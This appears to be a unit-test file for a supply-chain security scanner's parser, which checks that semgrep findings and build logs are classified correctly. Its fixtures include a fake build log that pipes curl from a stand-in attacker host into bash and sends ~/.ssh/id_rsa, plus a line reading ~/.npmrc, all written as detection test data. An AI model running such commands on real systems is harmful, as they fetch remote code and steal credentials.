"""Unit tests for p1hunt/runners/supply_chain.py — pure parser + tool-absent paths only.

These tests NEVER run semgrep/npm/python builds and NEVER touch the network. The pure parser
``parse_supply`` is exercised with realistic sample tool output; the executor is exercised only in
the toolchain-absent branch (asserting ``ran=False``).
"""

from __future__ import annotations

import json
import os
import tempfile
import unittest
from pathlib import Path

from p1hunt.runners.base import ReproSpec
from p1hunt.runners import supply_chain
from p1hunt.runners.supply_chain import SupplyChainRunner, parse_supply


def _spec(**kw) -> ReproSpec:
    return ReproSpec.from_dict(kw)


# A realistic semgrep JSON with a malicious-postinstall finding.
SEMGREP_MALICIOUS = json.dumps({
    "results": [
        {
            "check_id": "supply-chain.malicious-postinstall-exfil",
            "path": "package.json",
            "start": {"line": 7},
            "extra": {
                "message": "postinstall script downloads and executes a remote payload",
                "metadata": {"category": "security", "cwe": ["CWE-506"]},
            },
        }
    ],
    "errors": [],
    "paths": {"scanned": ["package.json", "scripts/setup.sh"]},
})

SEMGREP_CLEAN = json.dumps({
    "results": [],
    "errors": [],
    "paths": {"scanned": ["package.json", "setup.py", "ci.yml"]},
})

# A dynamic build log that exfiltrates during a postinstall step.
BUILD_LOG_EXFIL = """
npm WARN deprecated foo@1.0.0
> some-pkg@2.3.1 postinstall
> node ./scripts/collect.js
curl -s http://attacker.invalid/x | bash
sending ~/.ssh/id_rsa ...
build complete
"""

BUILD_LOG_CLEAN = """
> some-pkg@2.3.1 build
> tsc -p tsconfig.json
Successfully compiled 14 files.
"""


class ParseStaticTests(unittest.TestCase):
    def test_malicious_postinstall_reproduces_under_expect_fail(self):
        res = parse_supply(SEMGREP_MALICIOUS, 1, _spec(kind="static", expect="fail"), "static")
        self.assertTrue(res["reproduced"])
        self.assertIn("postinstall", res["detail"])
        self.assertIn("package.json", res["coverage"]["covered_symbols"])
        self.assertIn("scripts/setup.sh", res["coverage"]["covered_symbols"])
        self.assertEqual(res["coverage"]["tool"], "semgrep")
        self.assertGreaterEqual(res["coverage"]["findings"], 1)

    def test_clean_scan_does_not_reproduce_under_expect_fail(self):
        res = parse_supply(SEMGREP_CLEAN, 0, _spec(kind="static", expect="fail"), "static")
        self.assertFalse(res["reproduced"])
        self.assertIn("clean", res["detail"])
        # scanned paths still recorded as coverage
        self.assertIn("setup.py", res["coverage"]["covered_symbols"])

    def test_clean_scan_reproduces_under_expect_pass(self):
        # expect='pass' = "the clean-build invariant HELD" demonstrates it.
        res = parse_supply(SEMGREP_CLEAN, 0, _spec(kind="static", expect="pass"), "static")
        self.assertTrue(res["reproduced"])

    def test_malicious_does_not_reproduce_under_expect_pass(self):
        res = parse_supply(SEMGREP_MALICIOUS, 1, _spec(kind="static", expect="pass"), "static")
        self.assertFalse(res["reproduced"])

    def test_unparseable_json_stays_candidate(self):
        res = parse_supply("not json at all", 2, _spec(kind="static", expect="fail"), "static")
        self.assertFalse(res["reproduced"])
        self.assertIn("not parseable", res["detail"])
        self.assertEqual(res["coverage"]["covered_symbols"], [])


class ParseDynamicTests(unittest.TestCase):
    def test_exfil_indicator_reproduces_under_expect_fail(self):
        res = parse_supply(BUILD_LOG_EXFIL, 0, _spec(kind="dynamic", expect="fail"), "dynamic")
        self.assertTrue(res["reproduced"])
        self.assertTrue(any("script piped to a shell" in m for m in res["coverage"]["matched"]))
        self.assertIn("postinstall", res["coverage"]["covered_symbols"])

    def test_clean_build_does_not_reproduce_under_expect_fail(self):
        res = parse_supply(BUILD_LOG_CLEAN, 0, _spec(kind="dynamic", expect="fail"), "dynamic")
        self.assertFalse(res["reproduced"])
        self.assertIn("clean", res["detail"])

    def test_clean_build_reproduces_under_expect_pass(self):
        res = parse_supply(BUILD_LOG_CLEAN, 0, _spec(kind="dynamic", expect="pass"), "dynamic")
        self.assertTrue(res["reproduced"])

    def test_clean_build_nonzero_exit_does_not_hold_under_expect_pass(self):
        res = parse_supply(BUILD_LOG_CLEAN, 1, _spec(kind="dynamic", expect="pass"), "dynamic")
        self.assertFalse(res["reproduced"])

    def test_credential_read_indicator_detected(self):
        log = "> pkg postinstall\ncat ~/.npmrc && echo done\n"
        res = parse_supply(log, 0, _spec(kind="dynamic", expect="fail"), "dynamic")
        self.assertTrue(res["reproduced"])


class ParserRobustnessTests(unittest.TestCase):
    def test_parse_never_raises_on_garbage(self):
        for mode in ("static", "dynamic", "weird"):
            res = parse_supply("", 0, _spec(), mode)
            self.assertIn("reproduced", res)
            self.assertIn("coverage", res)

    def test_unknown_mode_defaults_to_dynamic(self):
        res = parse_supply(BUILD_LOG_EXFIL, 0, _spec(expect="fail"), "")
        self.assertTrue(res["reproduced"])


class SupportsTests(unittest.TestCase):
    def test_supports_supply_chain_only(self):
        r = SupplyChainRunner()
        self.assertTrue(r.supports("SUPPLY_CHAIN"))
        self.assertTrue(r.supports("supply_chain"))
        self.assertFalse(r.supports("WEB_API"))
        self.assertEqual(r.name, "supply_chain")


class ExecutorToolAbsentTests(unittest.TestCase):
    """Exercise run() only in the tool-absent / harness-absent branches (ran=False)."""

    def test_missing_harness_returns_did_not_run(self):
        r = SupplyChainRunner()
        with tempfile.TemporaryDirectory() as d:
            res = r.run(d, _spec(harness_path="does/not/exist.json", kind="static"))
        self.assertFalse(res.ran)
        self.assertFalse(res.reproduced)
        self.assertEqual(res.runner, "supply_chain")

    def test_static_tool_absent_returns_did_not_run(self):
        r = SupplyChainRunner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "rules.yml").write_text("rules: []\n")
            self.assertIsNone(supply_chain.safe_harness_path(d, "missing"))
            # Force semgrep "absent" via PATH stripping is brittle; instead drive a real
            # harness and rely on tool_available — but to stay hermetic, mock it.
            from unittest import mock
            with mock.patch.object(supply_chain, "run_command",
                                   return_value=(False, 127, "toolchain 'semgrep' not available")):
                res = r.run(d, _spec(harness_path="rules.yml", kind="static"))
        self.assertFalse(res.ran)
        self.assertFalse(res.reproduced)
        self.assertIn("not available", res.detail)

    def test_dynamic_tool_absent_returns_did_not_run(self):
        r = SupplyChainRunner()
        from unittest import mock
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "package.json").write_text('{"scripts": {"build": "tsc"}}')
            with mock.patch.object(supply_chain, "run_command",
                                   return_value=(False, 127, "toolchain 'npm' not available")):
                res = r.run(d, _spec(harness_path="package.json", kind="dynamic"))
        self.assertFalse(res.ran)
        self.assertFalse(res.reproduced)

    def test_dynamic_no_entrypoint_returns_did_not_run(self):
        r = SupplyChainRunner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "notes.txt").write_text("nothing buildable here")
            res = r.run(d, _spec(harness_path="notes.txt", kind="dynamic"))
        self.assertFalse(res.ran)
        self.assertIn("no declared build", res.detail)


class ExecutorParseWiringTests(unittest.TestCase):
    """run() must wire parse_supply output into ReproResult (mock the subprocess only)."""

    def test_static_finding_wired_into_result(self):
        from unittest import mock
        r = SupplyChainRunner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "rules.yml").write_text("rules: []\n")
            with mock.patch.object(supply_chain, "run_command",
                                   return_value=(True, 1, SEMGREP_MALICIOUS)):
                res = r.run(d, _spec(harness_path="rules.yml", kind="static", expect="fail"))
        self.assertTrue(res.ran)
        self.assertTrue(res.reproduced)
        self.assertIn("semgrep", res.command)
        self.assertIn("package.json", res.coverage["covered_symbols"])

    def test_dynamic_exfil_wired_into_result(self):
        from unittest import mock
        r = SupplyChainRunner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "package.json").write_text('{"scripts": {}}')
            with mock.patch.object(supply_chain, "run_command",
                                   return_value=(True, 0, BUILD_LOG_EXFIL)):
                res = r.run(d, _spec(harness_path="package.json", kind="dynamic", expect="fail"))
        self.assertTrue(res.ran)
        self.assertTrue(res.reproduced)
        self.assertEqual(res.command, "npm ci")


if __name__ == "__main__":
    unittest.main()
